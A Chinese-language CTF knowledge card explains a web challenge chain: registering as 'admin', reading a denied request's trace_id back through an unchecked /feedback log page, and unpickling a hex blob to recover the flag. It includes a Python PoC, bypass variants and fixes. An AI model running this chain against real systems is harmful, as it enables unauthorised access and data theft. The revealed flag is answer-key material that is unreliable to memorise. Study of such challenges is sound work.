---
id: ctf-web-admin-self-register-trace-id-pickle-log-leak
title: 自助注册 admin + 拒绝分支 trace_id 回读调试日志：hex pickle 对象泄露 flag
type: scenario
domain: ctf
path: ctf/web
technique: admin-self-register-trace-id-pickle-log-leak
aliases:
- 注册 admin
- flag-project-001
- trace_id
- /feedback 日志
- pickle hex stack_trace
- 灵感笔记
tags:
- ctf
- web
- auth
- self-register
- trace-id
- debug-log
- pickle
- info-leak
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:22:25+08:00'
  notes: 已对照原文核对：注册 admin/admin123、flag-project-001、/api/v1/project/detail 拒绝返回 trace_id、/feedback 回读 stack_trace、hex pickle 解出 type=FLAG_OBJECT/flag=ISCC{c4refu11_debug_tr4ce_l34k_1d0r}，均与卡片一致。未验证点：PoC 未本机复跑；CTF 无组件版本；frontmatter 无 sources/source_url。
---

## 一句话结论

系统允许直接注册用户名 `admin`，登录后进入管理员视角并看到高价值对象 `flag-project-001`；调用受保护的 `/api/v1/project/detail` 触发 `access_denied` 分支并返回 `trace_id`；`/feedback` 用 `trace_id` 回读日志，日志中的 `stack_trace` 是 hex 编码的 pickle 对象，离线 `pickle.loads` 即可直接取出 `flag` 字段。

## 原理

- **身份模型缺陷**：注册接口只校验用户名格式，不限制保留名/角色，`admin` 可被任意用户注册；服务端后续以用户名判断管理员视角，导致攻击者获得管理员可见的高价值对象 ID。
- **错误分支泄露 trace_id**：访问被拒绝时应用没有只返回 403，而是把内部错误对象序列化并记录，同时把 `trace_id` 返回给客户端；`trace_id` 成为日志查询键。
- **日志回读无权限校验**：`/feedback` 页面接受任意 `trace_id` 并展示对应日志，未校验请求者是否为该 trace 的拥有者或管理员。
- **pickle 对象泄露**：`stack_trace` 不是普通堆栈文本，而是 `pickle.dumps(obj).hex()`；`pickle.loads(bytes.fromhex(blob))` 会还原出包含 `type`、`flag`、`project_id`、`timestamp` 的字典。pickle 只是序列化格式，不需要反序列化 RCE 即可读取字段。

## 触发条件

- 注册接口允许保留用户名/管理员名，或角色由客户端可控。
- 受保护接口的拒绝分支返回 `trace_id`，且日志查询页可按 `trace_id` 读取。
- 日志中记录了内部对象（尤其是 pickle/JSON 序列化后的业务对象）。
- 攻击者能访问注册、登录、受保护接口与日志页。

## 利用步骤

1. `POST /register` 注册 `username=admin`，`POST /login` 登录，确认进入管理员视角并拿到高价值对象 ID（如 `flag-project-001`）。
2. `POST /api/v1/project/detail`，body `{"project_id":"flag-project-001"}`；不要期待返回正文，重点取响应中的 `trace_id`。
3. `POST /feedback`，提交 `trace_id`，获取日志页面。
4. 正则提取 `"stack_trace": "Object: <hex>"` 或 `"stack_trace": "<hex>"` 中的 hex。
5. `obj = pickle.loads(bytes.fromhex(hex_blob))`，读取 `obj["flag"]`。
6. 若日志是 JSON 嵌套/HTML 转义，先 `html.unescape` 再解析；若 hex 带前缀，去掉 `Object:` 等标记。

## PoC

```python
import pickle, re, requests

s = requests.Session()
s.post(f"{BASE}/register", data={"username": "admin", "password": "admin123"})
s.post(f"{BASE}/login", data={"username": "admin", "password": "admin123"})

detail = s.post(f"{BASE}/api/v1/project/detail", json={"project_id": "flag-project-001"})
trace_id = detail.json()["trace_id"]

html = s.post(f"{BASE}/feedback", data={"trace_id": trace_id}).text
hex_blob = re.search(r'"stack_trace":\s*"Object:\s*([0-9a-fA-F]+)"', html).group(1)
obj = pickle.loads(bytes.fromhex(hex_blob))
print(obj["flag"])
```

## 变体与关联

- **身份变体**：注册时可直接指定 `role=admin`；或用户名大小写/空格/Unicode 归一化绕过保留名；或邀请码可预测。
- **日志变体**：`trace_id` 可能在响应头、URL、Cookie；日志可能是 JSON、Base64、gzip；对象序列化可能是 JSON/repr 而非 pickle。
- **利用变体**：若日志中存在可控 pickle 且服务端会再次反序列化，可升级为 RCE；本例只需读取字段。
- **关联卡片**：[[web-generic-auth-oauth-commented-js-client-secret-register-ownerid-admin]]（注册时 ownerid 提权）、[[ctf-web-go-server-local-replay-admin-jwt]]（管理员态获取）、[[web-python-deserialization-django-file-cache-pickle-rce]]（pickle 反序列化风险）。
- **边界**：若注册接口校验保留名、日志页校验 trace 归属、或错误响应不返回 trace_id，本链不成立。

## 检测与防御

- **CTF 验证**：先确认注册 admin 后能进入管理员视角，再确认 trace_id 能读到日志且 hex 能解出对象。
- **修复**：注册时禁止保留用户名/管理员名，角色由服务端分配；错误响应只返回通用错误码，不返回内部 trace_id 给普通用户；日志查询做归属/权限校验；不要在日志中序列化含敏感字段的对象。
- **检测信号**：短时间内注册 `admin`/`root` 等保留名；大量 `trace_id` 枚举请求；日志中出现 `pickle` 序列化的业务对象。
